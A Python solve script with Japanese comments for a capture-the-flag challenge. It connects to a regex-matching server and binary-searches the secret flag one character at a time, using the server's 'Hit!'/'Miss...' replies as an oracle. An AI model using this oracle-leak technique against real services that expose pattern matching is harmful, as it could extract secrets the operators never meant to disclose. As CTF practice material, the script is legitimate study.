import socket
import string

# 接続先サーバーの情報
HOST = 1 # サーバーのIPアドレスまたはホスト名
PORT = 1 # サーバーのポート番号

def solve():
    print(f"Connecting to {HOST}:{PORT}...")
    
    # ソケットを作成してサーバーに接続
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # 初回のプロンプト "regex> " を受信（読み捨てる）
    s.recv(1024) 
    
    # フラグの既知の部分（最初は "Alpaca{" からスタート）
    flag = "Alpaca{"
    
    # フラグに含まれる可能性のある文字セットを定義
    # 数字、大文字、小文字、アンダースコア、閉じ括弧
    # これらをソートしてリスト化しておくことで、二分探索が可能になります
    charset = sorted(list(string.digits + string.ascii_uppercase + string.ascii_lowercase + "_}"))
    
    print(f"Starting binary search from: {flag}")
    
    # フラグが "}" で終わるまでループを続ける
    while not flag.endswith("}"):
        low = 0
        high = len(charset) - 1
        
        # 二分探索（Binary Search）で次の1文字を特定する
        # 候補文字の範囲を半分ずつ絞り込んでいく
        while low < high:
            mid = (low + high) // 2
            
            # 探索範囲の前半部分（lowからmidまで）の文字を取り出す
            subset = charset[low:mid+1]
            
            # 正規表現の文字クラス [...] を作成するために文字列結合
            # 例: subsetが ['a', 'b', 'c'] なら "abc" になる
            # 注意: 正規表現で特別な意味を持つ文字（]など）が含まれる場合はエスケープが必要ですが、
            # 今回のcharsetには単純な文字しか含まれていないためそのまま結合しています。
            char_class = "".join(subset)
            
            # サーバーに送る正規表現パターンを作成
            # 現在のフラグ + [候補文字群]
            # 例: "Alpaca{[a-m]" のようなパターンになる
            # これにより、「次の文字がこの範囲に含まれているか？」を一度に確認できる
            pattern = flag + "[" + char_class + "]"
            
            # パターンを送信（改行コードが必要）
            s.sendall((pattern + "\n").encode())
            
            # サーバーからのレスポンスを受信
            # "regex> " というプロンプトが来るまで読み込む
            resp = ""
            while "regex> " not in resp:
                chunk = s.recv(1024).decode()
                if not chunk: break
                resp += chunk
            
            # "Hit!" が返ってきた場合、正解の文字は送信した範囲（前半）に含まれている
            if "Hit!" in resp:
                high = mid
            # "Miss..." の場合、正解の文字は送信しなかった範囲（後半）に含まれている
            else:
                low = mid + 1
        
        # low == high になった時点で、文字が1つに特定された
        char = charset[low]
        flag += char
        print(f"Found: {flag}")
            
    s.close()
    print(f"Final Flag: {flag}")

if __name__ == "__main__":
    solve()
